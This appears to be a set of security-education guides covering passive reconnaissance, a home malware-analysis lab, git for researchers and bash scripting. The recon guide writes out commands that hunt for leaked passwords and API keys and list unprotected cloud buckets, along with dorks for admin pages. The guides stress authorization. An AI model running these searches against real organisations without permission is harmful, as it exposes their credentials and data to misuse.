curl -s "https://urlscan.io/api/v1/search/?q=domain:target.com" | jq '.results[].page.url'

# theHarvester
theHarvester -d target.com -b all -f results.html

# LinkedIn — manual, careful. Don't scrape — it's against ToS.
# Use Google: site:linkedin.com "works at target"

# Email pattern guessing
# john.doe@target.com, jdoe@target.com, johnd@target.com

# Shodan for the org
shodan search 'org:"Target Corp"'

# Censys
censys search 'services.service_name:HTTP and names:target.com'

# ASN lookup
whois -h whois.radb.net -- '-i origin AS12345'

# S3 buckets (in scope? check!)
aws s3 ls s3://target-backup --no-sign-request

# Azure blob
curl -s "https://target.blob.core.windows.net/container?restype=container&comp=list"

# GitHub search (via web UI, or GH API)
gh api -X GET search/code -f q='org:target password'

# TruffleHog on cloned repos
trufflehog filesystem ./cloned-repo
Keep everything in one file: domains, subdomains, IPs, emails, technologies, potential creds. Use a notes template — Obsidian or a markdown file. Future-you will thank present-you.

items: Don't test credentials you find without authorization
Don't share findings publicly without permission

title: Passive recon with public data
desc: Certificate transparency, DNS history, archive — clean sources, clean method.

content.x: Passive recon collects only from public data sources. No packets sent to the target. Nothing that could be flagged.
Every TLS certificate issued by a public CA is logged. If an org's subdomain has HTTPS, it's in CT logs.

items: SecurityTrails — historical A/AAAA/MX records, free tier available
AlienVault OTX — free, good for known-bad

content.x: Archived URLs often reveal old endpoints, admin paths, and API routes that were removed but not decommissioned.

site:target.com -inurl:www
site:target.com filetype:pdf
site:target.com inurl:admin
site:target.com ext:php
"@target.com" -site:target.com

# GitHub
# search web UI for: "target.com" password OR api_key OR secret

# Pastebin search (via Google)
site:pastebin.com "target.com"

# GitLab, Bitbucket similar
Job postings often name internal tools: "experience with Jenkins, Artifactory, custom SSO". Tech stack leaks from job ads, conference talks, and blog posts.

# theHarvester — multiple sources at once
theHarvester -d target.com -b all

# Photon — web crawler
photon -u https://target.com

# Recon-ng
recon-ng -w workspace

Passive recon is the easy part. The hard part is not crossing into active territory accidentally. Every request you send to the target is active — even a curl. Stick to third-party sources until you have authorization for active enumeration.

title: Building a home lab for security research
desc: VMs, snapshots, isolated networking — a lab you can rebuild in an hour.

content.x: A good home lab is isolated, reproducible, and cheap. Here's the minimum viable setup for security research.

items: A machine with at least 16 GB RAM (32 GB is comfortable)
Proxmox VE — free, web UI, great for hosting many VMs
VMware Workstation / Fusion — paid, very polished
VirtualBox — free, slower but fine for one or two VMs
Hyper-V (Windows Pro) — free if you have Pro

content.x:
# On Proxmox, create an isolated bridge (no uplink)
auto vmbr1
iface vmbr1 inet static
    address 10.10.10.1/24
    bridge-ports none
    bridge-stp off
    bridge-fd 0
    post-up echo 1 > /proc/sys/net/ipv4/ip_forward
VMs on vmbr1 can talk to each other, but not to the internet. Perfect for malware analysis.

items: Any Windows Server version you work with

content.x: Before any malware run, snapshot the VM. After analysis, roll back. Never analyze on a VM without a clean snapshot.

# Proxmox
qm snapshot 100 clean-before-analysis
qm rollback 100 clean-before-analysis

# Share a folder from host to VM (read-only)
# Or use a dedicated USB stick — wipe it after each session
# Never bridge a malware VM to your production LAN
What to keep on the host

items: Hypervisor only — no browsing, no email
A separate user account for lab work
Snapshot storage on a separate disk (or SSD) for speed

content.x:
1. Install hypervisor (Proxmox or VMware)
2. Create isolated bridge (vmbr1)
3. Deploy Windows VM, install FLARE-VM (PowerShell one-liner)
4. Deploy Linux VM, install your tooling
5. Deploy REMnux for malware
6. Take base snapshots on all
7. Test: VM on vmbr1 can't reach google.com
A capable lab takes 2-3 hours once you've done it. If you're starting from scratch, budget an evening. Worth it — every session after is safe and reproducible.

title: Git for security researchers
desc: Branches, bisect, stash — the git skills you'll actually use.

content.x: Most people learn git commands. Researchers need the handful that matter when you're tracing a bug or reproducing a patch.

git status
git diff
git add -p        # stage hunks interactively
git log --oneline --graph
git stash
Bisect — find the commit that broke it
Given a CVE's patch commit and a repo, you can walk backwards to find when a bug was introduced.

git bisect start
git bisect bad                     # current version is bad
git bisect good v1.2.0             # this old tag is fine
git bisect run ./test.sh           # script returns 0 = good, 1 = bad
# git tells you the first bad commit
git bisect reset
Blame — who wrote this line, in which commit

git blame src/parser.c
# ignore whitespace changes
git blame -w src/parser.c
# find when a line changed
git log -p -S 'memcpy(dst, src, n)' -- src/parser.c

# find commits that touch a string
git log -S 'hardcoded_key' --all
git log -G 'password.*=.*' --all

# find commits in a range
git log v1.2..v1.3 --oneline

# Pull a patch from a security advisory
git apply fix.patch

# Generate one
git diff > my.patch

# Cherry-pick a specific commit from another branch
git cherry-pick <commit-hash>

git stash
# switch to another branch, look at something else
git stash pop
git stash list
git stash show -p

# If the target uses a submodule, check the pinned commit
git submodule status

# Find known-vulnerable pins
git submodule foreach 'git log -1 --format="%h %s"'

git clone https://github.com/target/project.git
cd project
git log --oneline --graph | head -50      # recent activity
git log --grep="security\|CVE\|fix" --oneline  # security-related commits
git log --author="name" --oneline          # commits from a specific dev
git blame interesting_file.c

git config --global alias.lg "log --oneline --graph --all --decorate"
git config --global alias.last "log -1 HEAD --stat"
git config --global diff.algorithm histogram
# Better diffs for large refactors
histogram diff is worth knowing about — it produces cleaner output on heavily-refactored code.

title: Bash for small security scripts
desc: When bash is enough, when it isn't, and the idioms that save hours.

content.x: Bash is underrated. For many one-off tasks, it's faster than Python, has no dependencies, and integrates directly with everything on the system.

items: Error handling with retries and backoff

content.x: Strict mode — always start with this

#!/bin/bash
set -euo pipefail
# -e  : exit on error
# -u  : error on unset variable
# -o pipefail : fail on any pipe command failing
IFS=$'\n\t'   # safer word splitting

while IFS= read -r line; do
    echo "processing: $line"
done < input.txt
Never do `for line in $(cat file)` — it breaks on spaces. Use read.
Practical example — check a list of domains

#!/bin/bash
set -euo pipefail

INPUT="${1:?usage: $0 <domains.txt>}"
while IFS= read -r domain; do
    [[ -z "$domain" ]] && continue
    if host "$domain" >/dev/null 2>&1; then
        echo "[+] alive: $domain"
    else
        echo "[-] dead:  $domain"
    fi
done < "$INPUT"
cat domains.txt | xargs -n1 -P10 -I{} sh -c 'echo "{}" && host {} >/dev/null 2>&1 && echo "[+] {}"'
-P10 = 10 parallel processes. -n1 = one arg per invocation. Great for port scanning, subdomain checks, etc.

TMP=$(mktemp -d)
trap 'rm -rf "$TMP"' EXIT
# now use $TMP freely, it always gets cleaned up
Trap on EXIT, INT, TERM. Never leave temp files behind.
